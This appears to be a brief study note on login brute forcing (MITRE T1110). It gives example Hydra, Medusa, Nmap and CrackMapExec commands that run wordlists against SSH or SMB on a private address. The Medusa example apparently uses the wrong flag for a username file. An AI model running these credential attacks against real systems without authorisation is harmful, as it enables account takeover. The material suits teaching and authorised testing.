# Login Brute Forcing

## Introduction
In this study note, we will cover the basics of login brute forcing, a common technique used to gain unauthorized access to systems by attempting to guess or crack user credentials.

## Tools
Several tools can be used for brute forcing login attempts, including:
- **Hydra**: A network login cracker that supports many services.
- **Medusa**: A network login cracker that supports many services.
- **Nmap**: A powerful network scanning tool that can be used for brute forcing.
- **CrackMapExec**: A tool for network exploration and brute forcing.

## Techniques
The technique used in this study note is related to **T1110 - Brute Force**. This technique involves using automated tools to attempt multiple login attempts to gain unauthorized access.

## Example Commands
Here are some example commands for using the tools mentioned:
- **Hydra**:
  ```bash
  hydra -L usernames.txt -P passwords.txt -V -t 4 ssh://192.168.1.100
  ```
- **Medusa**:
  ```bash
  medusa -h 192.168.1.100 -u usernames.txt -P passwords.txt -M ssh
  ```
- **Nmap**:
  ```bash
  nmap -p 22 --script=brute 192.168.1.100
  ```
- **CrackMapExec**:
  ```bash
  crackmapexec smb 192.168.1.100 -u usernames.txt -p passwords.txt
  ```
